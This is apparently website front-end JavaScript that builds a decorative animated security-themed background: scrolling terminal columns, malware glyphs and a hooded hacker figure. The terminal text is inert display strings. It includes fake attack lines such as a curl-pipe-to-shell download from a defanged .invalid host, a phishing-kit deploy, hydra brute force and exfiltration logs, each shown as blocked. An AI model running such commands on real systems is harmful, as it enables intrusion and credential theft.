/* v2 cyber background (owner: cyberbg). Styles live in css/87-cyberbg.css.
   One fixed decorative layer behind every page: #v2CyberBg (z-index -4, just
   above the legacy .background at -5). It holds
     - a hexagon mesh that drifts slowly,
     - terminal columns of attacker / defender lines that scroll endlessly,
     - drifting malware glyphs (a few flash red, then settle green),
     - a hooded hacker poster figure with an occasional glitch,
     - a scan beam that sweeps down the screen.
   Rules this file keeps:
   - Everything is built detached and inserted ONCE, so the two body-wide
     MutationObservers (final-ui-fix, legal-upgrade) see a single childList
     mutation. Nothing inside <body> is touched afterwards.
   - All motion is CSS transform / opacity keyframes. There is no rAF loop.
   - State flags sit on <html> (outside the observed <body>):
       v2-bg-calm    a page other than #home is active (layer dims)
       v2-bg-paused  the tab is hidden (animations pause)
   - The SVG art is written here and handed to CSS as data-URI custom
     properties on #v2CyberBg (CSP img-src allows data:).
   - All text is fake and illustrative: private 10.x addresses, "185.x.x.x",
     and .invalid domains only. No real brands or organisations. */
(function () {
  "use strict";
  var win = window, doc = document, root = doc.documentElement;
  if (!root.classList.contains("v2") || doc.getElementById("v2CyberBg")) return;

  /* ---------- helpers ---------- */
  function svgUrl(vb, body) {
    return 'url("data:image/svg+xml,' +
      encodeURIComponent("<svg xmlns='http://www.w3.org/2000/svg' viewBox='" + vb + "'>" + body + "</svg>") + '")';
  }
  var seed = 7331;
  function rnd() { // mulberry32: the same columns on every visit
    seed = (seed + 0x6D2B79F5) | 0;
    var t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  }
  function pick(a) { return a[Math.floor(rnd() * a.length)]; }
  function f1(n) { return Math.round(n * 10) / 10; }

  /* ---------- 1. terminal columns ---------- */
  /* n neutral, k highlight, a attack (red), b blocked (green), h hex dump, e blank */
  var STORIES = [
    [["a", "$ ./phish-kit deploy --template bank-login"], ["n", "[phish-kit] cloning login page ..."], ["a", "[phish-kit] credential form deployed"], ["n", "GET /verify-account?session=8f2c HTTP/1.1"], ["k", "[scan] url reputation: malicious (0.97)"], ["b", "[ok] link quarantined"]],
    [["n", "GET /verify-account?session=8f2c HTTP/1.1"], ["n", "Host: secure-acct-verify.invalid"], ["n", "User-Agent: kit/4.2 (headless)"], ["k", "tls: cert mismatch  secure-acct-verify.invalid"], ["b", "[!] payload blocked by CyberNet"]],
    [["a", "sms> Your parcel is on hold. Pay $1.99 now"], ["n", "link: hxxp://parcel-redelivery-fee.invalid/p"], ["k", "[ai] verdict: SCAM  confidence 0.96"], ["b", "[ok] lure neutralised - user warned"]],
    [["n", "$ nmap -sS -p 1-1024 10.0.4.0/24"], ["n", "PORT      STATE     SERVICE"], ["n", "22/tcp    open      ssh"], ["n", "443/tcp   open      https"], ["n", "8080/tcp  filtered  http-proxy"], ["n", "[*] 3 hosts up  scanned in 4.21s"]],
    [["a", "payload: invoice_0931.pdf.exe  412 KB"], ["n", "sha256 3f9a1c7e04d2b8a6..b20d"], ["k", "[match] signature: loader.gen  98%"], ["b", "[!] payload blocked by CyberNet"]],
    [["n", "dns: secure-acct-verify.invalid -> 185.x.x.x"], ["n", "whois: created 2 days ago  registrar: redacted"], ["k", "[rule] new domain + login form -> phishing"], ["b", "[ok] domain blocklisted"]],
    [["a", "[c2] beacon from 10.0.4.17 every 30s"], ["n", "trace: 10.0.4.17 > 10.0.0.1 > 185.x.x.x"], ["b", "[ok] session token revoked"], ["b", "[ok] request dropped  src=185.x.x.x"]],
    [["n", "$ tail -f /var/log/mail.log"], ["n", "from=<billing@refund-desk.invalid> to=<you>"], ["n", "subject: Action required: unusual sign-in"], ["n", "[*] dkim=fail spf=softfail dmarc=fail"], ["k", "[ai] lure: fake refund + impersonation"], ["b", "[ok] message flagged as scam"]],
    [["n", "$ hydra -l admin -P wordlist.txt 10.0.4.9 ssh"], ["n", "[*] 1,204 attempts  0 valid"], ["b", "[ok] ip rate-limited  10.0.4.66"]],
    [["a", "$ curl -s hxxp://wallet-unlock.invalid/drop.sh | sh"], ["n", "[*] fetching stage2 ..."], ["k", "[ai] behaviour: downloader -> high risk"], ["b", "[!] script blocked by CyberNet"]],
    [["a", "exfil> 10.0.4.23 -> 185.x.x.x  2.3 MB"], ["n", "[*] tcp 10.0.4.23:51644 -> 185.x.x.x:443"], ["b", "[ok] connection reset  host isolated"]],
    [["n", "$ strings payload.bin | grep -i pass"], ["n", "pass=%s&otp=%s&card=%s"], ["a", "POST /collect  user=*** pass=*** otp=******"], ["k", "[rule] credential harvest pattern"], ["b", "[ok] form submission blocked"]],
    [["a", "[urgent] account locked - verify within 24h"], ["k", "[rule] urgency + payment request -> scam"], ["b", "[ok] recovery plan ready"]],
    [["n", "$ cybernet scan --deep message.eml"], ["n", "[*] links 3  attachments 1  sender 1"], ["k", "[ai] verdict: SCAM  confidence 0.93"], ["b", "[ok] 0 threats on device"]]
  ];
  var LONERS = ["[*] scanning 10.0.4.0/24 ...", "ssh: connect to 10.0.4.9 port 22: refused", "HTTP/1.1 302 Found  Location: /login",
    "[*] heuristics 14/14 complete", "0x7f4a  3c 21 0e ff 9a 00 4c 1b", "[*] tls 1.3  cipher aes_256_gcm", "[*] waiting for callback ...",
    "ack 4021  seq 99812  win 64240", "[*] model: lure-detect v7  ready"];
  function hexLine(off) {
    var b = [], asc = "";
    for (var i = 0; i < 8; i++) {
      var v = Math.floor(rnd() * 256);
      b.push(("0" + v.toString(16)).slice(-2));
      asc += v > 32 && v < 127 ? String.fromCharCode(v) : ".";
    }
    return ("000" + off.toString(16)).slice(-4) + "  " + b.join(" ") + "  " + asc;
  }
  function buildBlock(n) {
    var text = [], type = [];
    function push(t, s) { type.push(t); text.push(s); }
    while (text.length < n) {
      var r = rnd();
      if (r < 0.58) { pick(STORIES).forEach(function (l) { push(l[0], l[1]); }); push("e", ""); }
      else if (r < 0.78) { var off = Math.floor(rnd() * 4000) * 16, k = 2 + Math.floor(rnd() * 4); for (var i = 0; i < k; i++) push("h", hexLine(off + i * 8)); }
      else if (r < 0.92) push("n", pick(LONERS));
      else push("e", "");
    }
    return { text: text.slice(0, n), type: type.slice(0, n) };
  }
  var INK = {
    n: "rgba(34,211,238,.5)", e: "rgba(34,211,238,.5)", h: "rgba(103,232,249,.34)",
    k: "rgba(165,243,252,.95)", a: "#FF4D6D", b: "#34F5C5"
  };
  /* Per-line colour as one hard-stop gradient under background-clip:text,
     so a whole column stays one element with one text node. */
  function inkGradient(types, lh) {
    var stops = [], cur = null, start = 0;
    for (var i = 0; i <= types.length; i++) {
      var c = i < types.length ? INK[types[i]] : null;
      if (c !== cur) {
        if (cur !== null) stops.push(cur + " " + start + "px " + i * lh + "px");
        cur = c; start = i * lh;
      }
    }
    return "linear-gradient(180deg," + stops.join(",") + ")";
  }
  /* x/w in vw, o opacity, fs/lh px, d seconds per loop, up/down.
     Order matters: phones show the first 3, tablets the first 6. Edge columns
     (the empty margins) are the brightest; the ones behind content stay faint. */
  var COLS = [
    { x: 0.5, w: 7.6, o: 0.3, fs: 11, lh: 18, d: 120, up: 1 },
    { x: 91.9, w: 8.1, o: 0.28, fs: 11, lh: 18, d: 140, up: 0 },
    { x: 46, w: 10, o: 0.13, fs: 10, lh: 16, d: 210, up: 1 },
    { x: 15.2, w: 10.5, o: 0.16, fs: 10.5, lh: 17, d: 170, up: 0 },
    { x: 72, w: 10.5, o: 0.16, fs: 10.5, lh: 17, d: 180, up: 1 },
    { x: 30.5, w: 9.5, o: 0.1, fs: 9.5, lh: 15, d: 240, up: 1 },
    { x: 59, w: 9.5, o: 0.1, fs: 9.5, lh: 15, d: 230, up: 0 },
    { x: 84, w: 7.4, o: 0.14, fs: 10, lh: 16, d: 160, up: 1 }
  ];
  var tall = Math.max(win.innerHeight || 0, (win.screen && win.screen.height) || 0, 900) + 160;

  /* ---------- 2. malware glyphs (drawn pre-coloured: no CSS masks, so no offscreen passes) ---------- */
  var K = "stroke='#000' fill='none' stroke-linecap='round' stroke-linejoin='round'";
  function spiky(n, rr, r1, kr) {
    var s = "<circle cx='24' cy='24' r='" + rr + "' " + K + " stroke-width='2.2'/><circle cx='24' cy='24' r='3.4'/><circle cx='19.6' cy='19.8' r='1.4'/><circle cx='28.4' cy='27.6' r='1.6'/><circle cx='27.6' cy='19.4' r='1'/>";
    for (var i = 0; i < n; i++) {
      var a = i / n * Math.PI * 2 + 0.35, c = Math.cos(a), si = Math.sin(a);
      s += "<path d='M" + f1(24 + c * (rr + 1)) + " " + f1(24 + si * (rr + 1)) + "L" + f1(24 + c * r1) + " " + f1(24 + si * r1) + "' " + K + " stroke-width='2'/>" +
        "<circle cx='" + f1(24 + c * (r1 + kr * 0.7)) + "' cy='" + f1(24 + si * (r1 + kr * 0.7)) + "' r='" + kr + "'/>";
    }
    return s;
  }
  function worm() {
    var s = "", prev = null;
    for (var i = 0; i < 6; i++) {
      var x = 9 + i * 10.4, y = 14 + Math.sin(i * 1.05) * 5.2, r = 6 - i * 0.62;
      if (prev) s += "<path d='M" + f1(prev[0]) + " " + f1(prev[1]) + "L" + f1(x) + " " + f1(y) + "' " + K + " stroke-width='1.6'/>";
      s += "<circle cx='" + f1(x) + "' cy='" + f1(y) + "' r='" + f1(r) + "' " + (i ? K + " stroke-width='1.8'" : "") + "/>";
      prev = [x, y];
    }
    return s;
  }
  var GLYPH = {
    virus: ["0 0 48 48", spiky(8, 9, 15.5, 2.5)],
    virus2: ["0 0 48 48", spiky(11, 8, 13, 1.7) + "<circle cx='24' cy='24' r='12.4' " + K + " stroke-width='.8' stroke-dasharray='1.5 2.5'/>"],
    phage: ["0 0 40 58", "<path d='M20 3 29 8.2v10.4L20 23.8 11 18.6V8.2Z' " + K + " stroke-width='2'/><path d='M20 9 24.2 11.5v5L20 19 15.8 16.5v-5Z' fill-opacity='.55'/><rect x='16.5' y='24.6' width='7' height='3' rx='1'/><path d='M18.4 28h3.2v14h-3.2zM18.4 31.6h3.2M18.4 35.2h3.2M18.4 38.8h3.2' " + K + " stroke-width='1.3'/><path d='M12.5 43h15' " + K + " stroke-width='2'/><path d='M14 43.4 7.4 50l-2 6.4M26 43.4l6.6 6.6 2 6.4M17.6 43.8 13.6 55M22.4 43.8 26.4 55' " + K + " stroke-width='1.5'/>"],
    bug: ["0 0 44 48", "<ellipse cx='22' cy='28.5' rx='8.6' ry='11.6' " + K + " stroke-width='2.2'/><path d='M22 17.4v22.4' " + K + " stroke-width='1.5'/><circle cx='22' cy='12.6' r='4.4' " + K + " stroke-width='2'/><path d='M19.6 8.8 15.4 3.6M24.4 8.8l4.2-5.2M13.6 22.4 5.4 18.6M13.4 29H3.8M14 35.6 6 40.8M30.4 22.4l8.2-3.8M30.6 29h9.6M30 35.6l8 5.2' " + K + " stroke-width='1.8'/><rect x='17' y='24' width='2.6' height='2.6' rx='.6'/><rect x='24.4' y='30.4' width='2.6' height='2.6' rx='.6'/>"],
    worm: ["0 0 72 28", worm()],
    key: ["0 0 64 26", "<circle cx='10' cy='13' r='7' " + K + " stroke-width='2.4'/><circle cx='10' cy='13' r='2.4'/><path d='M17 13h40' " + K + " stroke-width='2.4'/><path d='M42 13v6.2h3.6v-3.4h3.6v5.2h3.6v-3h3.6V13' " + K + " stroke-width='2'/>"],
    hook: ["0 0 30 52", "<circle cx='19' cy='5' r='3' " + K + " stroke-width='1.8'/><path d='M19 8v27a7 7 0 0 1-14 0v-7' " + K + " stroke-width='2.4'/><path d='M5 27.4 9.8 33' " + K + " stroke-width='2'/>"]
  };
  function glyph(g, col, alpha) {
    return svgUrl(g[0], "<g fill='" + col + "' opacity='" + alpha + "'>" + g[1].replace(/#000/g, col) + "</g>");
  }
  /* t glyph, x/y % of the viewport, h px, o opacity, a drift keyframes, d s,
     th = flashes red as a threat, then settles green. First 6 are kept on phones.
     Each glyph is its own compositor layer (threats are three), so the count stays low. */
  var BUGS = [
    { t: "virus", x: 3.2, y: 24, h: 40, o: 0.42, a: "a", d: 46 },
    { t: "phage", x: 91, y: 15, h: 46, o: 0.36, a: "b", d: 58 },
    { t: "virus", x: 57.5, y: 19, h: 34, o: 0.7, a: "c", d: 52, th: 1 },
    { t: "hook", x: 95.5, y: 55, h: 34, o: 0.4, a: "b", d: 50 },
    { t: "bug", x: 57, y: 86, h: 32, o: 0.36, a: "a", d: 62 },
    { t: "key", x: 3.6, y: 74, h: 18, o: 0.38, a: "c", d: 54 },
    { t: "worm", x: 76, y: 8.5, h: 22, o: 0.32, a: "b", d: 64 },
    { t: "phage", x: 33, y: 90, h: 38, o: 0.6, a: "a", d: 60, th: 1 },
    { t: "virus2", x: 1.6, y: 47, h: 30, o: 0.38, a: "b", d: 66 }
  ];

  /* ---------- 3. hooded hacker (poster duotone) ---------- */
  var HOOD = "M200 30C246 30 292 58 310 112C326 160 324 222 306 268C300 284 298 298 306 310C344 326 374 350 388 390C396 412 399 436 400 460L0 460C1 436 4 412 12 390C26 350 56 326 94 310C102 298 100 284 94 268C76 222 74 160 90 112C108 58 154 30 200 30Z";
  var HOOD_EDGE = "M0 460C1 436 4 412 12 390C26 350 56 326 94 310C102 298 100 284 94 268C76 222 74 160 90 112C108 58 154 30 200 30C246 30 292 58 310 112C326 160 324 222 306 268C300 284 298 298 306 310C344 326 374 350 388 390C396 412 399 436 400 460";
  var FACE = "M200 88C240 88 264 122 266 170C268 222 248 266 218 290C210 296 205 299 200 299C195 299 190 296 182 290C152 266 132 222 134 170C136 122 160 88 200 88Z";
  var JAW = "M200 150C227 150 245 177 245 212C245 249 226 279 200 285C174 279 155 249 155 212C155 177 173 150 200 150Z";
  var LID = "M128 372L272 372L290 460L110 460Z";
  function hacker(c, full) {
    // c: { rim, ice, dot } colours. full=false draws the light parts only (glitch copies).
    var s = "<defs>" +
      "<radialGradient id='u' cx='200' cy='378' r='250' gradientUnits='userSpaceOnUse'><stop offset='0' stop-color='" + c.ice + "' stop-opacity='.5'/><stop offset='.32' stop-color='" + c.dot + "' stop-opacity='.2'/><stop offset='1' stop-color='" + c.dot + "' stop-opacity='0'/></radialGradient>" +
      "<radialGradient id='f' cx='200' cy='340' r='130' gradientUnits='userSpaceOnUse'><stop offset='0' stop-color='" + c.ice + "' stop-opacity='.55'/><stop offset='.45' stop-color='" + c.dot + "' stop-opacity='.16'/><stop offset='1' stop-color='" + c.dot + "' stop-opacity='0'/></radialGradient>" +
      "<radialGradient id='g'><stop offset='0' stop-color='" + c.ice + "' stop-opacity='.9'/><stop offset='1' stop-color='" + c.dot + "' stop-opacity='0'/></radialGradient>" +
      "<linearGradient id='r' x1='30' y1='0' x2='330' y2='240' gradientUnits='userSpaceOnUse'><stop offset='0' stop-color='" + c.rim + "' stop-opacity='.95'/><stop offset='.5' stop-color='" + c.rim + "' stop-opacity='.35'/><stop offset='1' stop-color='" + c.rim + "' stop-opacity='.05'/></linearGradient>" +
      "<radialGradient id='hm' cx='200' cy='400' r='280' gradientUnits='userSpaceOnUse'><stop offset='0' stop-color='#fff' stop-opacity='1'/><stop offset='.55' stop-color='#fff' stop-opacity='.35'/><stop offset='1' stop-color='#fff' stop-opacity='0'/></radialGradient>" +
      "<linearGradient id='hl' x1='0' y1='0' x2='190' y2='0' gradientUnits='userSpaceOnUse'><stop offset='0' stop-color='#fff' stop-opacity='.75'/><stop offset='1' stop-color='#fff' stop-opacity='0'/></linearGradient>" +
      "<mask id='m' maskUnits='userSpaceOnUse' x='0' y='0' width='400' height='460'><rect width='400' height='460' fill='url(#hm)'/><rect width='400' height='460' fill='url(#hl)'/></mask>" +
      "<pattern id='d' width='5' height='5' patternUnits='userSpaceOnUse'><circle cx='2.5' cy='2.5' r='1.1' fill='" + c.dot + "'/></pattern>" +
      "<pattern id='s' width='4' height='4' patternUnits='userSpaceOnUse'><rect y='3' width='4' height='1' fill='#000' fill-opacity='.55'/></pattern>" +
      "<linearGradient id='j' x1='0' y1='176' x2='0' y2='286' gradientUnits='userSpaceOnUse'><stop offset='0' stop-color='" + c.dot + "' stop-opacity='0'/><stop offset='.6' stop-color='" + c.dot + "' stop-opacity='.1'/><stop offset='1' stop-color='" + c.ice + "' stop-opacity='.34'/></linearGradient>" +
      "<linearGradient id='jr' x1='0' y1='200' x2='0' y2='286' gradientUnits='userSpaceOnUse'><stop offset='0' stop-color='" + c.ice + "' stop-opacity='0'/><stop offset='1' stop-color='" + c.ice + "' stop-opacity='.75'/></linearGradient>" +
      "<clipPath id='c'><path d='" + HOOD + "'/></clipPath>" +
      "<clipPath id='fc'><path d='" + FACE + "'/></clipPath>" +
      "</defs>";
    // fabric: halftone dots shaded by the under-light and a left rim
    s += "<g clip-path='url(#c)'><rect width='400' height='460' fill='url(#d)' mask='url(#m)' opacity='.75'/>" +
      "<rect width='400' height='460' fill='url(#u)'/>" +
      // folds: hood seam, sides, collar into the chest
      "<path d='M200 32C201 54 201 72 200 88M104 140C110 196 122 236 146 270M296 140C290 196 278 236 254 270M150 262C140 298 122 320 94 334M250 262C260 298 278 320 306 334M184 294C188 318 194 334 200 346M216 294C212 318 206 334 200 346M60 360C76 380 88 410 94 460M340 360C324 380 312 410 306 460' fill='none' stroke='" + c.rim + "' stroke-opacity='.26' stroke-width='1.3' stroke-linecap='round'/>" +
      "<rect width='400' height='460' fill='url(#s)'/></g>";
    // the face: a void, lit only from below
    s += "<path d='" + FACE + "' fill='#000'/>" +
      "<path d='" + FACE + "' fill='none' stroke='" + c.dot + "' stroke-opacity='.22' stroke-width='9'/>" +
      "<path d='" + FACE + "' fill='none' stroke='url(#r)' stroke-width='1.6'/>" +
      "<g clip-path='url(#fc)'><rect width='400' height='460' fill='url(#f)'/>" +
      // the lower face catches the screen light: jaw and chin out of the dark, eyes stay hidden
      "<path d='" + JAW + "' fill='url(#j)'/>" +
      "<path d='" + JAW + "' fill='none' stroke='url(#jr)' stroke-width='1.5'/>" +
      "<rect width='400' height='460' fill='url(#s)'/></g>";
    // rim light along the hood edge
    s += "<path d='" + HOOD_EDGE + "' fill='none' stroke='url(#r)' stroke-width='2.2'/>";
    // the laptop lid: dark, with screen light spilling over its top edge
    if (full) s += "<path d='" + LID + "' fill='#010407'/>";
    s += "<path d='" + LID + "' fill='none' stroke='" + c.rim + "' stroke-opacity='.28' stroke-width='1.2'/>" +
      "<ellipse cx='200' cy='370' rx='118' ry='24' fill='url(#g)'/>" +
      "<path d='M131 372.5H269' stroke='" + c.ice + "' stroke-width='1.8' stroke-linecap='round'/>" +
      "<circle cx='200' cy='418' r='2' fill='" + c.dot + "' fill-opacity='.5'/>";
    return s;
  }
  var CYAN = { rim: "#67E8F9", ice: "#A5F3FC", dot: "#22D3EE" };
  var RED = { rim: "#FF4D6D", ice: "#FF9DB0", dot: "#FF4D6D" };
  var ICE = { rim: "#A5F3FC", ice: "#E6FDFF", dot: "#67E8F9" };

  /* ---------- 4. build + insert once ---------- */
  function build() {
    var bg = doc.createElement("div");
    bg.id = "v2CyberBg";
    bg.setAttribute("aria-hidden", "true");
    var st = bg.style;
    st.setProperty("--v2-bg-hk-cut", svgUrl("0 0 400 460", "<path d='" + HOOD + "' fill='#010407'/>"));
    st.setProperty("--v2-bg-hk-art", svgUrl("0 0 400 460", hacker(CYAN, true)));
    st.setProperty("--v2-bg-hk-red", svgUrl("0 0 400 460", hacker(RED, false)));
    st.setProperty("--v2-bg-hk-ice", svgUrl("0 0 400 460", hacker(ICE, false)));

    var hex = doc.createElement("div"); hex.className = "v2-bg-hexwrap";
    hex.appendChild(doc.createElement("i")).className = "v2-bg-hex";
    bg.appendChild(hex);

    var code = doc.createElement("div"); code.className = "v2-bg-code";
    COLS.forEach(function (c, i) {
      seed = 7331 + i * 977;
      var n = Math.ceil(tall / c.lh), blk = buildBlock(n);
      var el = doc.createElement("div");
      el.className = "v2-bg-col" + (c.up ? "" : " v2-bg-down");
      var s = el.style;
      s.setProperty("--x", c.x);
      s.setProperty("--w", c.w);
      s.setProperty("--o", c.o);
      s.setProperty("--fs", c.fs + "px");
      s.setProperty("--lh", c.lh + "px");
      s.setProperty("--d", c.d + "s");
      s.setProperty("--dl", "-" + f1(rnd() * c.d) + "s");
      s.backgroundImage = inkGradient(blk.type.concat(blk.type), c.lh);
      el.textContent = blk.text.concat(blk.text).join("\n");
      code.appendChild(el);
    });
    bg.appendChild(code);

    var vir = doc.createElement("div"); vir.className = "v2-bg-vir";
    BUGS.forEach(function (b, i) {
      var g = GLYPH[b.t], vb = g[0].split(" "), el = doc.createElement("i");
      el.className = "v2-bg-v" + (b.th ? " v2-bg-t" : "");
      var s = el.style;
      s.setProperty("--x", b.x + "%");
      s.setProperty("--y", b.y + "%");
      s.setProperty("--h", b.h + "px");
      s.setProperty("--ar", vb[2] / vb[3]);
      s.setProperty("--an", "v2-bg-drift-" + b.a);
      s.setProperty("--d", b.d + "s");
      s.setProperty("--dl", "-" + (i * 7.3 % b.d).toFixed(1) + "s");
      if (b.th) {
        // three stacked colour layers with the alpha baked in, so the glyph
        // itself keeps opacity 1 and needs no offscreen group
        s.setProperty("--gc", glyph(g, "#22D3EE", b.o));
        s.setProperty("--gr", glyph(g, "#FF4D6D", b.o));
        s.setProperty("--gg", glyph(g, "#34F5C5", b.o));
        s.setProperty("--fdl", "-" + (i * 3.1 % 13).toFixed(1) + "s");
        el.appendChild(doc.createElement("i"));
      } else {
        s.setProperty("--g", glyph(g, "#22D3EE", 1));
        s.setProperty("--o", b.o);
      }
      vir.appendChild(el);
    });
    bg.appendChild(vir);

    var hk = doc.createElement("div"); hk.className = "v2-bg-hk";
    ["cut", "art", "g1", "g2"].forEach(function (k) { hk.appendChild(doc.createElement("i")).className = "v2-bg-hk-" + k; });
    bg.appendChild(hk);

    bg.appendChild(doc.createElement("i")).className = "v2-bg-beam";

    var legacy = doc.querySelector("body > .background");
    if (legacy && legacy.parentNode === doc.body) doc.body.insertBefore(bg, legacy.nextSibling);
    else doc.body.insertBefore(bg, doc.body.firstChild);
  }

  /* ---------- 5. state flags on <html> ---------- */
  function syncPage() {
    var home = doc.getElementById("home");
    root.classList.toggle("v2-bg-calm", !(home && home.classList.contains("active-page")));
  }
  function syncVisible() { root.classList.toggle("v2-bg-paused", !!doc.hidden); }

  function init() {
    if (!doc.body || doc.getElementById("v2CyberBg")) return;
    build();
    syncPage();
    syncVisible();
    doc.addEventListener("visibilitychange", syncVisible);
    // The SPA moves .active-page between section.page elements; watch only their class.
    if ("MutationObserver" in win) {
      var mo = new MutationObserver(syncPage);
      Array.prototype.forEach.call(doc.querySelectorAll("section.page"), function (p) {
        mo.observe(p, { attributes: true, attributeFilter: ["class"] });
      });
    }
    win.addEventListener("popstate", function () { setTimeout(syncPage, 400); });
  }
  if (doc.readyState === "loading") doc.addEventListener("DOMContentLoaded", init, { once: true });
  else init();
})();
